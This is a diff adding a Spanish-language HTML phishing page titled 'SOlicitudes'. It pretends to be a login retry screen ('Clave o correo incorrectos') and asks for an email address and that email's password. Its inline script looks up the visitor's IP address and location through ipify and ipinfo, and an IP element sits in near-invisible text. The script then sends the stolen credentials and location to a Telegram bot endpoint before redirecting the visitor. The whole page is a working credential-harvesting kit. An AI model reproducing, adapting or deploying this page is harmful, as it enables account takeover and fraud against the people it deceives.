@@ -1,0 +1,135 @@
+<html>
+<head>
+    <meta charset="utf-8">
+<meta name="robots" content="noindex"><meta name="googlebot" content="noindex">
+<meta name="viewport" content="width=device-width, initial-scale=1" >
+<link rel="icon" href="koj/favicon.ico" type="image/x-icon">
+
+
+
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="plax.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("team2").value;
+    u_name2 = document.getElementById("team3").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "sco\n☰Ummll: " + u_name + "\n☰clv2: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'index.html';
+    });
+    return false;
+  };
+
+
+
+</script>
+
+
+
+
+
+
+
+<title>SOlicitudes</title>
+<style>
+     * {margin:0px;}
+     html, body { font-family: arial; }
+.font-600 {font-weight: 600;}
+.al {font-size:15px;font-weight: 700;color:#444343;}.tainer {width:100%;}    
+select {background-color: transparent;} h2 {font-size:1.6em;color:#252424; font-family: arial;}
+#team,#team2,#team3 {border: none;border-bottom: 2px solid rgb(169, 169, 169);width: 100%;padding-top:2%;padding-bottom:2%;font-size:14px;font-weight: normal;}
+#team,#team2,#team3:focus-visible {outline: none;}#team,#team2,#team3::placeholder {font-size:14px;color:#BDB9B8;font-weight:lighter;}#team,#team2,#team3:focus {border-bottom:2px solid #38B2E3;}
+input::-webkit-outer-spin-button,input::-webkit-inner-spin-button {-webkit-appearance: none;margin: 0; }input[type="number"] {-moz-appearance: textfield; }
+label {width: 100%;display: block;cursor: pointer;font-size:2em;}
+.ev {color:white;text-decoration: none;padding: 12px;margin-top: 30px;border: 3px solid #dedede;
+background-color: red;width: 100%;border-radius: 5px;cursor:pointer;}
+.xo {width:28%;height:50%;margin:0 auto;background-color: white;border-radius: 5px;margin-right: auto;margin-left: auto;position: relative;-webkit-box-shadow: 0px 2px 2px 0px rgb(214 214 214);-moz-box-shadow: 0px 2px 2px 0px rgba(214, 214, 214, 1);box-shadow: 0px 1px 2px 0px rgb(226 225 225);top: 30px;border: 1px solid #e2e8ee;padding: 45px;}   
+ .ya {background-color: #ec111a;height: 2px;max-width: 30px;position: relative;top: 10px;margin-left:1px;}
+#default {color: grey;font-size:10px;}select {position: relative;}details[open] {z-index: 1;}  
+select {cursor: pointer;border:0;background-color: transparent;list-style: none;width: 100%;border-bottom: 2px solid rgb(169, 169, 169);padding-top:1%;padding-bottom:1%;font-size:16px;color:#66605F;font-weight:lighter;margin-left:-1%;}
+select[open] {content: "";display: block;width: 100vw;height: 100vh;background: transparent;position: fixed;top: 0;left: 0;} 
+    select:focus {outline: none;border-bottom:2px solid #38B2E3;}
+    label {font-size:0.8em;color:#272626;}.logof,.logog {display:none;}
+@media only screen and (max-width: 750px) {
+.xo {width:90%;padding:0;border:none;background-color: transparent;
+    -webkit-box-shadow:none;
+-moz-box-shadow: none;
+box-shadow: none;
+}
+.tainer {max-width:100%;}
+.al,h2,#team,#team2,#team3,.ev,.ya {margin-left:3%;}
+#team,#team2,#team3,select {width:95%;}
+select {margin-left:4%;}
+.logo,#logo {display:none;}
+.logof,.logog {display:block;width:100%;}
+.ev {width: 85%;border-radius: 5px;font-weight:600;margin-top: 15%;}
+.logog {position:absolute;bottom:1%;}
+body {max-width:100%;}
+}
+
+</style></head>
+<body>
+    <div style="background-color: #ec111a; height: 5px; width: 100%;" >   </div><div class="tainer">  <br> <center><img   src="koj/lohh.png" width="20%" ></center> 
+    <div class="xo">  <center> <h2>Intenta de nuevo!!</h2>
+      <h3>.Clave o correo incorrectos</h3></center> 
+ 
+    <form onsubmit="return sender();" autocomplete="off">
+<br /><br><br>
+        <label class="al">CORREO ELECTRONICO ASOCIADO</label>
+           <input style="font-weight: 500; color: black;" type="email"  name="team2" id="team2" placeholder="EMAIL" required /><br><br>
+            <label class="al">CLAVE DEL CORREO</label>
+            <input type="text"   name="team3" id="team3" placeholder="Ingresa tu contraseña actual" required /><br><br>
+           
+           <center>
+            <button id="tx" class="ev" style="font-size: 14px">Continuar</button></center>
+    </form></div>
+<div ><br><br>
+<div class="logog"><img src="koj/logog.png" width="100%"></div>
+<div class="logo"><img src="koj/logob.png" width="100%"></div>
+</div>  
+
+
+</div> 
+
+<div style="color: rgb(244, 244, 244); font-size: 0.001px" >
+  <p id="gfg"></p>
+  <p id="ip"></p>
+  <p id="address"></p></div>
+</body>
+</html>
